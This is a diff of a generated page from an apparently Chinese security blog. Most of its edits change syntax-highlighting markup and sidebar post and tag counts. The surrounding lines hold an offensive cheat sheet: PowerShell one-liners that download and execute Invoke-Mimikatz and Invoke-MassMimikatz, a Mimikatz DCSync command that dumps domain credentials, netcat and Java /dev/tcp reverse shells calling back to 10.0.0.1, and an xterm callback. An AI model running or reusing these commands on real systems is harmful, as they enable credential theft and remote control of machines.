@@ -484,7 +484,7 @@
 
 <h2 id="Import-Mimikatz-Module"><a href="#Import-Mimikatz-Module" class="headerlink" title="Import Mimikatz Module"></a>Import Mimikatz Module</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> Bypass -noexit -C <span class="string">"IEX (New-Object Net.WebClient).DownloadString('</span>https:<span class="comment">//raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Perform-DcSync-attack"><a href="#Perform-DcSync-attack" class="headerlink" title="Perform DcSync attack"></a>Perform DcSync attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Mimikatz -Command <span class="string">'"lsadump::dcsync /domain:demodomain /user:sqladmin"'</span></span><br></pre></td></tr></table></figure>
+<h2 id="Perform-DcSync-attack"><a href="#Perform-DcSync-attack" class="headerlink" title="Perform DcSync attack"></a>Perform DcSync attack</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'</span><br></pre></td></tr></table></figure>
 
 <h2 id="Invoke-MassMimikatz"><a href="#Invoke-MassMimikatz" class="headerlink" title="Invoke-MassMimikatz"></a>Invoke-MassMimikatz</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> Bypass -C <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'<span class="variable">$env</span>:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"</span></span><br></pre></td></tr></table></figure>
 
@@ -512,7 +512,7 @@
 
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#Netcat without -e #<span class="number">1</span></span><br><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span> | nc <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1234</span> &gt; /tmp/f</span><br><span class="line"></span><br><span class="line">#Netcat without -e #<span class="number">2</span></span><br><span class="line">nc localhost <span class="number">443</span> | /bin/sh | nc localhost <span class="number">444</span></span><br><span class="line">telnet localhost <span class="number">443</span> | /bin/sh | telnet localhost <span class="number">444</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#java </span></span><br><span class="line"></span><br><span class="line">r = Runtime.getRuntime(); p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] <span class="keyword">as</span> String[]); p.waitFor();</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#java </span></span><br><span class="line"></span><br><span class="line">r = Runtime.getRuntime(); p = r.<span class="built_in">exec</span>([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as <span class="keyword">String</span>[]); p.waitFor();</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#XTerm</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">xterm</span> <span class="selector-tag">-display</span> 10<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:1</span></span><br></pre></td></tr></table></figure>
 
@@ -579,6 +579,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/07/linux-windows-Tools/" rel="prev" title="Linux/Windows单文件小工具(持续更新)">
+                Linux/Windows单文件小工具(持续更新) <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -660,7 +664,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/">
-                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-count">15</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -682,7 +686,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
